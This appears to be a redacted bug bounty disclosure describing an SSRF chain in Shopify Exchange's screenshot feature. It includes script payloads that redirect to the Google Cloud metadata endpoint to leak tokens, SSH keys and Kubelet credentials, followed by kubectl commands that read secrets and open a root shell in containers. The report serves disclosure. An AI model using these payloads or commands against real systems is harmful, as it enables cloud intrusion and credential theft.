## SSRF in Exchange leads to ROOT access in all instances
https://hackerone.com/reports/341876

The Exploit Chain - How to get root access on all Shopify instances

### Access Google Cloud Metadata 
1. Create a store (partners.shopify.com) 
2. Edit the template password.liquid and add the following content:

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
// iframes don't work here because Google Cloud sets the `X-Frame-Options: SAMEORIGIN` header.
</script>
```
3. Go to https://exchange.shopify.com/create-a-listing and install the Exchange app
4. Wait for the store screenshot to appear on the Create Listing page
5. Download the PNG and open it using image editing software or convert it to JPEG (Chrome displays a black PNG)

Exploring SSRFs in Google Cloud instances require a special header.
The /v1beta1 endpoint is still available, does not require the Metadata-Flavor: Google header 

* the web screenshot software wasn't producing any images for application/text responses
* add the parameter alt=json to force application/json responses

```
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json";
</script>
```

### Dumping kube-env 

* Made a new request to: http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json in order to see the rest of the Kubelet certificate and the Kubelet private key.

Able to get all the certificate

### Using Kubelet to execute arbitrary commands

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://example.com/ get pods --all-namespaces
```

Creating new pdo 

```
kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://████████ create -f https://k8s.io/docs/tasks/debug-application-cluster/shell-demo.yaml

kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████████ delete pod shell-demo
```
Getting shell was not allowed

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://█████████ exec -it shell-demo -- /bin/bash

Error from server (Forbidden): pods "shell-demo" is forbidden: User "███" cannot create pods/exec in the namespace "default": Unknown user "███"
```


The get secrets command doesn't work, but it's possible to describe a given pod and the get the secret using its name and leaked the kubernetes.io service account token using the instance ████ from the namespace ████:


```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://███ describe pods/█████ -n █████████

Name:           ████████
Namespace:      ██████
Node:           ██████████
Start Time:     Fri, 23 Mar 2018 13:53:13 +0000
Labels:         █████
                ████
                █████
Annotations:    <none>
Status:         Running
IP:             █████████
Controlled By:  █████
Containers:
  default-http-backend:
    Container ID:   docker://███
    Image:          ██████
    Image ID:       docker-pullable://█████
    Port:           ████/TCP
    Host Port:      0/TCP
    State:          Running
      Started:      Sun, 22 Apr 2018 03:23:09 +0000
    Last State:     Terminated
      Reason:       Error
      Exit Code:    2
      Started:      Fri, 20 Apr 2018 23:39:21 +0000
      Finished:     Sun, 22 Apr 2018 03:23:07 +0000
    Ready:          True
    Restart Count:  180
    Limits:
      cpu:     10m
      memory:  20Mi
    Requests:
      cpu:        10m
      memory:     20Mi
    Liveness:     http-get http://:███/healthz delay=30s timeout=5s period=10s #success=1 #failure=3
    Environment:  <none>
    Mounts:
      ██████
Conditions:
  Type           Status
  Initialized    True
  Ready          True
  PodScheduled   True
Volumes:
 ██████████:
    Type:        Secret (a volume populated by a Secret)
    SecretName: ███████
    Optional:    false
QoS Class:       Guaranteed
Node-Selectors:  <none>
Tolerations:     node.kubernetes.io/not-ready:NoExecute for 300s
                 node.kubernetes.io/unreachable:NoExecute for 300s
Events:          <none>
```

```
$ kubectl --client-certificate client.crt --client-key client.pem --certificate-authority ca.crt --server https://██████ get secret███████ -n ███████ -o yaml

apiVersion: v1
data:
  ca.crt: ██████████
  namespace: ████
  token: ██████████==
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: default
    kubernetes.io/service-account.uid: ████
  creationTimestamp: 2017-01-23T16:08:19Z
  name:█████
  namespace: ██████████
  resourceVersion: "115481155"
  selfLink: /api/v1/namespaces/████████/secrets/████
  uid: █████████
type: kubernetes.io/service-account-token
```

And finally, it's possible to use this token to get a shell in any container:

```
$ kubectl --certificate-authority ca.crt --server https://████ --token "█████.██████.███" exec -it w█████████ -- /bin/bash

Defaulting container name to web.
Use 'kubectl describe pod/w█████████' to see all of the containers in this pod.
███████:/# id
uid=0(root) gid=0(root) groups=0(root)
█████:/# ls
app  boot   dev  exec  key  lib64  mnt  proc  run   srv  start  tmp  var
bin  build  etc  home  lib  media  opt  root  sbin  ssl  sys    usr
███████:/# exit
```
